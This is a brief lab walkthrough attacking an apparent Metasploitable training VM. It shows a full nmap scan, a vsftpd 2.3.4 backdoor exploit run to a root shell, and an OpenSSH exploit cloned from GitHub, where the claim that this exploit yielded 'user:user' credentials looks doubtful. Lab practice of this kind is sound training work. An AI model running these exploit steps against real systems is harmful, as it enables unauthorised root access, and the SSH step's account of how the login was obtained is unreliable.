## Recon

```bash
nmap -sV -O -p- 10.10.10.3
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-25 09:32 -0500
Nmap scan report for 10.10.10.3
Host is up (0.0027s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
33383/tcp open  nlockmgr    1-4 (RPC #100021)
41073/tcp open  status      1 (RPC #100024)
53682/tcp open  java-rmi    GNU Classpath grmiregistry
55420/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:C7:96:A4 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.991%E=4%D=11/25%OT=21%CT=1%CU=35660%PV=Y%DS=1%DC=D%G=Y%M=080027
OS:%TM=6B06F221%P=x86_64-pc-linux-gnu)SEQ(SP=B6%GCD=1%ISR=C8%TI=Z%CI=Z%TS=7
OS:)SEQ(SP=BF%GCD=1%ISR=CE%TI=Z%CI=Z%TS=7)SEQ(SP=CA%GCD=1%ISR=C9%TI=Z%CI=Z%
OS:II=I%TS=7)SEQ(SP=CC%GCD=1%ISR=C8%TI=Z%CI=Z%TS=7)SEQ(SP=CD%GCD=1%ISR=D2%T
OS:I=Z%CI=Z%TS=7)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O4=M5B4S
OS:T11NW5%O5=M5B4ST11NW5%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5
OS:=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW5%CC=N%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%
OS:O=M5B4ST11NW5%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=B1C2A1A3%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=B1C2A1A3%Q=)T6(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=B1C2A1A3%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=B1C2A1A3%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.54 seconds
```
## Exploiting one by one

### Port 21 vsFTP Exploit

```bash
searchsploit vsftpd 2.3.4

locate unix/remote/49757.py

cp /usr/share/exploitdb/exploits/unix/remote/49757.py ./

python 49757.py -h

python3 49757.py 10.10.10.3

Success, shell opened
Send `exit` to quit shell
pwd
/
whoami
root
```


### Port 22 ssh Exploit

```bash
namp -sV -sC -O -p22 10.10.10.3

# i Googled for the any Exploit availabale or not then i found this one

git clone https://github.com/talha3117/OpenSSH-4.7p1-CVE-2008-5161-Exploit.git

cd OpenSSH-4.7p1-CVE-2008-5161-Exploit

chmod +x openssh.py

python3 -m venv venv3

source venv3/bin/activate

python3 -m pip install --upgrade pip

python3 -m pip install pwntools

python3 openssh.py 

Enter Target IP:  10.10.10.3
```
got the username and password user:user

and finally got Shell

